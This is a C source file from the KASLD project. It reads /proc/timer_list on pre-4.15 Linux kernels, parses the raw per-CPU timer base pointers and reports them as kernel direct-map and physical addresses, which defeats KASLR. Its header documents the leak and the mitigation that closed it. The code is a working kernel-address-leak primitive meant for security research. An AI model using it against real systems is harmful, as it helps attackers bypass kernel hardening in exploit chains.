// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read per-CPU timer base pointers from /proc/timer_list '.base:' lines.
//
// kernel/time/timer_list.c prints the per-CPU timer base struct pointer
// via raw '%p' on '.base:' lines:
//
//   .base:       ffff88001234abcd
//
// This is a direct-map address pointing into per-CPU data; it bounds
// page_offset_base. The file is world-readable (0444) and populated on
// every kernel since timer_list was introduced.
//
// The '%p' → salted-hash change in v4.15 (commit ad67b74d) replaced all
// remaining raw pointer output including '.base:', making these values
// opaque on v4.15+. Detection: parsed values not in the kernel VA range
// indicate hashing is active.
//
// Leak primitive:
//   Data leaked:      per-CPU timer base pointer (direct-map address)
//   Kernel subsystem: kernel/time/timer_list.c — /proc/timer_list
//   Data structure:   struct timer_base (per-CPU)
//   Address type:     virtual (direct-map)
//   Method:           parsed (proc text file)
//   Status:           hashed in v4.15 (commit ad67b74d)
//   Access check:     none (world-readable, mode 0444)
//   Source:
//   https://elixir.bootlin.com/linux/v4.14/source/kernel/time/timer_list.c
//
// Mitigations:
//   v4.15 global '%p' salted-hash change (commit ad67b74d) hashes all
//   pointer output including '.base:'.
//
// References:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ad67b74d2469d9b82aaa572d76474c95bc484d57
// https://elixir.bootlin.com/linux/v4.14/source/kernel/time/timer_list.c
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads per-CPU timer base pointers from /proc/timer_list '.base:' lines. "
    "The struct timer_base pointer is printed via raw '%p' and resides in the "
    "direct-map range, bounding page_offset_base. World-readable (0444) on "
    "mainline. Hashed in v4.15 (commit ad67b74d); parsed values outside the "
    "kernel VA range indicate hashing is active.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "patch:v4.15\n");

int main(void) {
  const char *path = "/proc/timer_list";
  char line[512];
  int count = 0;

  printf("[.] scanning %s for timer base addresses ...\n", path);

  FILE *f = fopen(path, "r");
  if (!f) {
    int e = errno;
    perror("[-] fopen");
    return (e == EACCES || e == EPERM) ? KASLD_EXIT_NOPERM
                                       : KASLD_EXIT_UNAVAILABLE;
  }

  while (fgets(line, sizeof(line), f)) {
    /* Per-CPU timer base lines:
     *   "  .base:       ffff88001234abcd"
     * Stop after the first valid result. */
    const char *bp = strstr(line, ".base:");
    if (!bp)
      continue;

    const char *p = bp + strlen(".base:");
    while (*p == ' ')
      p++;

    char *endptr;
    unsigned long val = strtoul(p, &endptr, 16);
    ptrdiff_t len = endptr - p;

    if (len < (ptrdiff_t)(sizeof(void *) * 2))
      continue;

    /* Direct-map range: PAGE_OFFSET to start of kernel text.
     * On 32-bit or coupled arches PAGE_OFFSET == KERNEL_BASE_MIN;
     * accept any kernel VA in that case. */
    int in_dmap = (val >= PAGE_OFFSET && val < KERNEL_BASE_MIN);
    int in_kvas =
        (!in_dmap && val >= KERNEL_VAS_START && val <= KERNEL_VAS_END);

    if (in_dmap || in_kvas) {
      printf("timer base address: 0x%016lx\n", val);
      kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, val,
                   KASLD_REGION_DIRECTMAP, NULL);
#if !PHYS_VIRT_DECOUPLED
      {
        unsigned long phys = virt_to_phys(val);
        printf("  possible physical address: 0x%016lx\n", phys);
        kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, phys,
                     KASLD_REGION_DIRECTMAP, NULL);
      }
#endif
      count++;
      break;
    }
  }

  fclose(f);

  if (!count)
    printf("[-] no timer base address found in %s\n", path);

  return 0;
}
